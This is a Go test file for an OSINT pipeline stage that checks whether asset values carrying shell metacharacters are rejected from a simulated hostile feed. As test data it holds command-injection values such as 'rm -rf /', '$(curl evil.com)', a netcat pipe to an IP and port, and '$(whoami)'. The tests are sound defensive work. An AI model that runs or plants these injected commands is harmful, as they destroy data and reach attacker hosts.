package osint_test

import (
	"context"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/cosmics/cosmics/internal/domain"
	"github.com/cosmics/cosmics/internal/osint"
	"github.com/cosmics/cosmics/internal/pipeline"
	"github.com/cosmics/cosmics/internal/pipeline/stages"
	"github.com/cosmics/cosmics/internal/store"
)

// hostileSource is an adapter that returns attacker-controlled data, modelling
// a compromised or malicious public feed.
type hostileSource struct{}

func (hostileSource) Name() string { return "hostile" }

func (hostileSource) Query(_ context.Context, _ string) ([]osint.Record, error) {
	return []osint.Record{
		{
			Kind:       "subdomain",
			Value:      "evil.com; rm -rf /",
			Source:     "hostile",
			Confidence: 0.9,
			Attrs:      map[string]string{"origin": "feed"},
		},
		{
			Kind:       "url",
			Value:      "https://ok.example.test/$(whoami)",
			Source:     "hostile",
			Confidence: 0.9,
		},
	}, nil
}

// recordingAssets records every asset the stage tried to persist.
type recordingAssets struct {
	persisted []store.Asset
}

func (r *recordingAssets) UpsertAsset(_ context.Context, asset store.Asset) (store.Asset, error) {
	r.persisted = append(r.persisted, asset)
	return asset, nil
}

func (r *recordingAssets) ListAssets(context.Context, domain.ID) ([]store.Asset, error) {
	return r.persisted, nil
}

func (r *recordingAssets) CountAssets(context.Context, domain.ID, string) (int, error) {
	return len(r.persisted), nil
}

type injectionClock struct{}

func (injectionClock) Now() domain.TimestampMs { return 1_760_000_000_000 }

func Test_source_records_never_inject_a_target_when_the_value_contains_shell_metacharacters(t *testing.T) {
	// Given a source whose records carry shell metacharacters
	assets := &recordingAssets{}
	stage, err := stages.NewOSINTStage(stages.OSINTDeps{
		Assets:  assets,
		Sources: osint.NewRegistry(hostileSource{}),
		Targets: []domain.Target{{Kind: domain.TargetDomain, Value: "example.test"}},
		Clock:   injectionClock{},
	})
	require.NoError(t, err)

	state := &pipeline.State{
		Engagement: domain.Engagement{ID: domain.NewULIDGenerator().New()},
		Run:        pipeline.StageRunRef{ID: domain.NewULIDGenerator().New(), Stage: domain.StageOSINT, Attempt: 1},
		Clock:      injectionClock{},
	}

	// When the stage consumes the hostile feed
	require.NoError(t, stage.Body(context.Background(), state))

	// Then nothing reaches persistence, and therefore nothing can reach an executor
	assert.Empty(t, assets.persisted, "no hostile value may be persisted as an asset")
	reasons := stage.LastSourceErrors()
	require.NotEmpty(t, reasons, "each rejected record must be reported")
	joined := ""
	for _, reason := range reasons {
		joined += reason + "\n"
	}
	assert.Contains(t, joined, "rejected")
}

func Test_normalizer_rejects_a_target_value_with_shell_metacharacters(t *testing.T) {
	for _, value := range []string{
		"evil.com; rm -rf /",
		"evil.com && whoami",
		"evil.com|nc 10.0.0.1 4444",
		"$(curl evil.com)",
		"a`id`b.example.test",
		"evil.com > /tmp/x",
	} {
		t.Run(value, func(t *testing.T) {
			// When
			normalized, err := stages.NormalizeValue("subdomain", value)

			// Then
			require.Error(t, err)
			assert.Empty(t, normalized, "a rejected value must not be returned for use")
			require.ErrorIs(t, err, stages.ErrUnsafeAssetValue)
		})
	}
}

func Test_record_to_asset_refuses_a_hostile_record_when_the_source_is_trusted(t *testing.T) {
	// Given a record that names a valid source but carries a hostile value
	record := osint.Record{
		Kind:       "subdomain",
		Value:      "evil.com; rm -rf /",
		Source:     "crtsh",
		Confidence: 0.9,
	}

	// When
	asset, err := stages.RecordToAsset(domain.NewULIDGenerator().New(), record, 1_760_000_000_000)

	// Then the provenance of the record does not buy it any trust
	require.Error(t, err)
	assert.Equal(t, store.Asset{}, asset)
	require.ErrorIs(t, err, stages.ErrUnsafeAssetValue)
}

func Test_normalizer_accepts_a_legitimate_subdomain(t *testing.T) {
	normalized, err := stages.NormalizeValue("subdomain", "API.Example.Test")
	require.NoError(t, err)
	assert.Equal(t, "api.example.test", normalized)
}
